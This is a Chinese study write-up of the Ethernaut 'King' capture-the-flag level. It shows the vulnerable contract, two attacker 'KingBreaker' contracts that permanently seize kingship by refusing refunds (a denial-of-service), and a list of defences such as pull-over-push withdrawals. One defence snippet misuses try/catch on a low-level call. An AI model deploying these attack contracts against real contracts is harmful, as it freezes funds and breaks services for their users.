# 9-King

# 问题描述

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

**When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

# 解题思路

目的是让这个合约没有办法继续运作

- 写一个攻击合约，成为king
- 该合约是payable，但是没有没有 `receive` 或 `fallback` 函数
    - 或者说 `receive` 或 `fallback` 函数没有效果
- Level来reclaim的时候，代码`payable(king).transfer(msg.value);`会失败
- 合约功能失效，攻击成功

## 攻击合约

### 方法一

部署一个没有 `receive` 或 `fallback` 函数的合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBreaker {
    constructor(address _king) payable {
        // 将此合约设置为 King 合约的 King
        (bool success, ) = _king.call{value: msg.value}("");
        require(success, "Transfer failed.");
    }
}
```

### 方法二

这种方式稍微复杂一点，写一个合约，提供一个 `sendEth` 函数来主动向 `King` 合约发送以太币，但该合约的 `receive` 或 `fallback` 函数将确保无法接受任何返回的以太币，从而阻止任何新的玩家成为 King。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBreaker {
    address public king;

    constructor(address _king) payable {
        king = _king;
        sendEth();
    }

    function sendEth() public payable {
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "Transfer failed.");
    }

    // 不接收任何以太币
    fallback() external payable {
        revert("I am the King now!");
    }

    receive() external payable {
        revert("I am the King now!");
    }
}
```

# 预防办法

### 1. **使用 `pull-over-push` 模式**

在 `pull-over-push` 模式中，不是主动将资金发送给用户，而是让用户自行提取资金。这样可以避免外部调用失败导致合约中断。例如：

```solidity
solidityCopy code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address public king;
    uint256 public prize;
    address public owner;
    mapping(address => uint256) public balances;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    function becomeKing() external payable {
        require(msg.value >= prize || msg.sender == owner);
        balances[king] += prize; // 记录给前任king的奖励
        king = msg.sender;
        prize = msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}

```

在这种情况下，前任 `king` 需要主动调用 `withdraw()` 函数来提取奖金，这样即使转账失败，也不会影响合约的正常运行。

### 2. **引入 `try/catch` 处理失败的外部调用**

如果使用较高版本的 Solidity（0.6.0及以上），你可以利用 `try/catch` 来处理失败的外部调用，避免整个交易的失败：

```solidity
solidityCopy code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address public king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    function becomeKing() external payable {
        require(msg.value >= prize || msg.sender == owner);
        address previousKing = king;
        king = msg.sender;
        prize = msg.value;

        // 处理失败的转账操作
        try payable(previousKing).call{value: msg.value}("") {
            // 转账成功
        } catch {
            // 转账失败，采取其他措施
            // 比如可以存入合约或者其他操作
        }
    }
}

```

### 3. **设置特定的 `King` 角色**

你可以将 `king` 角色限制为只有特定地址才能拥有，这样可以避免外部合约参与游戏。比如可以限制为只有经过验证的用户（例如通过KYC验证）才能成为 `king`。

### 4. **设置一个超时机制**

可以设置一个超时机制，如果在一段时间内没有新玩家成为 `king`，合约将自动重置或资金自动返还给原所有者。这种机制可以防止合约被锁死在一个恶意合约上。

### 5. **将 `king` 角色的更换放在两个交易中完成**

如果 `king` 的更换分成两个步骤（比如先设置新的 `king`，然后用户在另一笔交易中领取奖金），即使恶意合约阻止了奖金转账，游戏的进行也不会受到阻碍。

### 总结

通过这些方法，你可以减少类似攻击的风险，提高合约的安全性。最有效的解决方案通常是基于合约的具体需求，结合多种防护措施来实现。

# 小白笔记（思考的点）

1. 使用方法二的时候，需要先把Eth打给KingBreaker合约，然后再调用Eth来去claim成为king
    1. 没有第一种方法来得直观
2. 防御方法一`pul-over-push` ，代码中使用了一个mapping来确定用户可以提取的amount
    1. 是否可以用approve来实现呢？
    2. 只是突然想到了，有点脱了裤子放屁的感觉。。

### ChatGPT的一些回答

**approve 和 ERC20 标准**

approve 和 allowance 是 ERC20 标准中的方法，通常用于代币的转移授权。ETH 不是 ERC20 代币，所以你不能直接使用 approve 和 allowance 方法来管理 ETH 的提取。approve 是为代币设计的，而不是为原生以太币（ETH）设计的。

**用 approve 管理 ETH 的问题**

1.	**ETH 和 ERC20 的区别**:

•	ETH 是原生的以太坊链上的货币，而 approve 方法仅适用于 ERC20 代币。因此，你不能用 approve 直接管理 ETH 的转移或提取权限。

2.	**需要自定义实现**:

•	如果你想实现类似 approve 的逻辑用于 ETH 的提取，你需要自行编写逻辑，例如创建一个 mapping，记录哪些地址有提取 ETH 的权限以及最大提取额度。

**直接使用合约余额的风险**

你提到将余额加到合约的 balance 中，实际上这就是合约默认的处理方式，合约的余额始终保存在合约地址本身，而不是在某个单独的 mapping 中。这种方式的主要问题是你无法为每个地址设置不同的提取权限。合约的 balance 只能由合约自身或者经过编写好的逻辑进行管理。